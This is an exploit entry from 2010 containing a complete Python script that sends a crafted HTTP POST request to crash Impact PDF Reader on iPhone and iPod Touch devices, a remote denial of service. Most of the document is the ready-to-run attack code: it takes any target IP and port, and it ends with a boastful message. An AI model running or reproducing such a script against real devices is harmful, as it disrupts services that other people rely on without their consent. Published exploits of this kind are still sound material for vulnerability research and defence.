# Exploit: Impact PDF Reader v2.0 for iPhone/iPod Touch POST Method Remote DoS
# Date: 14/06/2010
# Author: Nishant Das Patnaik
# Website: http://nishantdaspatnaik.yolasite.com
# Software Link: http://itunes.apple.com/us/app/impact-pdf-reader/id322140783?mt=8*
# Version: 2.0, 1.2
# Tested on: iPod 2G with iOS v3.1.3
# Note: Impact PDF Reader v2.0 and prior program versions are also vulnerable.

#!/usr/bin/env python
import os
import sys
import socket
def main(argv):
    argc = len(argv)
    if argc != 3:
        print "Usage: %s <target-ip> <target-port>" % (argv[0])
        sys.exit(0)
    host = argv[1]
    port = int(argv[2])
    print "[+] Connecting: %s:%d" % (host, port)
    payload = "POST / HTTP/1.1\r\n"
    payload += "Host: %s:%d\r\n" % (host, port)
    payload += "Content-Length: 3\r\n\r\n"
    payload += "..."
    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))
    print "[+] Sending payload..."
    print "[+] Did you see that b00m? ;) http://nishantdaspatnaik.yolasite.com"
    sd.send(payload)
    sd.close()
if __name__ == "__main__":
    main(sys.argv)
    sys.exit(0)